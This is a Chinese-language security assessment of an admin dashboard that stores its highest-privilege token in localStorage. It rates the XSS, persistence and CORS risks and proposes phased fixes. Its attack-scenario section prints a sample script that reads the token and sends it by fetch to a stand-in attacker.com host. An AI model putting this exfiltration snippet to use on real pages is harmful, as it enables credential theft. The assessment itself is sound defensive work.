# 安全性評估：Admin Dashboard Token 儲存機制

## 當前實作
```javascript
// admin-dashboard.html
localStorage.setItem('setup_token', token);
const savedToken = localStorage.getItem('setup_token');
```

## 安全性問題分析

### 🔴 Critical: XSS (Cross-Site Scripting) 漏洞

**問題：**
localStorage 可被任何 JavaScript 存取，若應用程式存在 XSS 漏洞，攻擊者可輕易竊取 SETUP_TOKEN。

**攻擊場景：**
```javascript
// 惡意腳本可直接讀取
const stolenToken = localStorage.getItem('setup_token');
// 傳送到攻擊者伺服器
fetch('https://attacker.com/steal', { 
    method: 'POST', 
    body: stolenToken 
});
```

**影響範圍：**
- SETUP_TOKEN 是 Admin 最高權限 token
- 可創建、更新、刪除所有名片
- 可撤銷所有 Session
- 可執行 KEK 輪替（系統級操作）

### 🟡 Medium: Token 持久化風險

**問題：**
localStorage 永久保存，即使關閉瀏覽器也不會清除。

**風險：**
- 共用電腦環境下，其他使用者可能存取
- Token 無自動過期機制
- 忘記登出時持續暴露

### 🟡 Medium: 無 CSRF 保護需求

**說明：**
localStorage 不會自動附加到請求（需手動設定 Authorization header），因此不受 CSRF 攻擊影響。這是唯一的優點。

---

## 業界最佳實踐

### ✅ 推薦方案：HttpOnly Cookies

**優點：**
1. **XSS 防護**：JavaScript 無法存取（`HttpOnly` flag）
2. **自動傳送**：瀏覽器自動附加到請求
3. **CSRF 防護**：配合 `SameSite=Strict` flag
4. **安全傳輸**：配合 `Secure` flag（僅 HTTPS）

**實作範例：**
```javascript
// 後端設定 Cookie
Set-Cookie: setup_token=xxx; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```

**前端無需改動：**
```javascript
// Cookie 自動附加，無需手動設定 Authorization header
fetch('/api/admin/cards', { credentials: 'include' });
```

### ⚠️ 次佳方案：sessionStorage + 短期 Token

**優點：**
1. 關閉分頁即清除（比 localStorage 安全）
2. 不跨分頁共享
3. 仍可使用 Authorization header

**缺點：**
1. 仍受 XSS 攻擊影響
2. 使用者體驗較差（需重複登入）

---

## 當前系統的緩解措施

### ✅ 已實作的安全措施

1. **Timing-Safe Token 比對**（`workers/src/middleware/auth.ts`）
   ```typescript
   timingSafeEqual(Buffer.from(token), Buffer.from(expectedToken))
   ```

2. **CORS 限制**
   ```typescript
   'Access-Control-Allow-Origin': '*' // ⚠️ 應限制為特定 domain
   ```

3. **HTTPS 強制**（Cloudflare Workers 預設）

4. **Token 長度與複雜度**
   - 64 字元 hex string
   - 高熵值（256 bits）

### ❌ 缺少的安全措施

1. **無 Content Security Policy (CSP)**
   - 無法防止內聯腳本執行
   - 無法限制外部資源載入

2. **無 XSS 防護機制**
   - 未使用 DOMPurify 或類似工具
   - 部分地方使用 `innerHTML`（已在 v2.1.0 修復部分）

3. **無 Token 過期機制**
   - SETUP_TOKEN 永久有效
   - 無自動登出

4. **CORS 設定過於寬鬆**
   - `Access-Control-Allow-Origin: *` 允許任何來源

---

## 風險評級

| 風險 | 等級 | 可能性 | 影響 | 優先級 |
|------|------|--------|------|--------|
| XSS 竊取 Admin Token | 🔴 Critical | Medium | Critical | P0 |
| 共用電腦 Token 洩漏 | 🟡 Medium | Low | High | P1 |
| CORS 濫用 | 🟡 Medium | Low | Medium | P2 |
| Token 永久有效 | 🟢 Low | Low | Medium | P3 |

---

## 建議改進方案

### Phase 1: 立即改進（最小改動）

1. **改用 sessionStorage**
   ```javascript
   // 替換所有 localStorage 為 sessionStorage
   sessionStorage.setItem('setup_token', token);
   const savedToken = sessionStorage.getItem('setup_token');
   ```
   - 關閉分頁即清除
   - 降低持久化風險

2. **新增 CSP Header**
   ```typescript
   // workers/src/index.ts
   headers: {
       'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline' cdn.tailwindcss.com unpkg.com cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com;"
   }
   ```

3. **限制 CORS**
   ```typescript
   'Access-Control-Allow-Origin': 'https://your-domain.com'
   ```

### Phase 2: 中期改進（架構調整）

1. **實作 HttpOnly Cookies**
   - 後端設定 Cookie
   - 前端移除 Authorization header
   - 使用 `credentials: 'include'`

2. **Token 過期機制**
   - 設定 Max-Age（如 1 小時）
   - 實作 Refresh Token

3. **XSS 防護**
   - 使用 DOMPurify 清理所有動態內容
   - 移除所有 `innerHTML` 使用

### Phase 3: 長期改進（完整安全）

1. **實作 OAuth 2.0 / OIDC**
   - 使用標準認證協議
   - 支援 MFA

2. **Session 管理**
   - 後端 Session 儲存
   - 定期輪替 Session ID

3. **安全審計**
   - 定期滲透測試
   - 自動化安全掃描

---

## 結論

**當前設計存在安全性問題：**
- ✅ Token 本身安全（高熵值、Timing-Safe 比對）
- ❌ 儲存機制不安全（localStorage 易受 XSS 攻擊）
- ❌ 缺少 XSS 防護措施（無 CSP、無 DOMPurify）
- ❌ Token 永久有效（無過期機制）

**建議優先級：**
1. **P0（立即）**：改用 sessionStorage + 新增 CSP
2. **P1（本週）**：限制 CORS + XSS 防護
3. **P2（本月）**：實作 HttpOnly Cookies + Token 過期

**風險接受度：**
- 若為內部管理系統（受信任環境），當前風險可接受
- 若為公開網路環境，**必須立即改進**

---

## 參考資料

Content was rephrased for compliance with licensing restrictions:

1. localStorage 易受 XSS 攻擊，因 JavaScript 可直接存取
2. HttpOnly Cookies 提供更好的 XSS 防護
3. 應配合 Secure 和 SameSite flags 使用
4. CSP 是防止 XSS 的重要機制
5. Admin Token 應有過期機制

來源：
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- 多個安全研究文章（見搜尋結果）
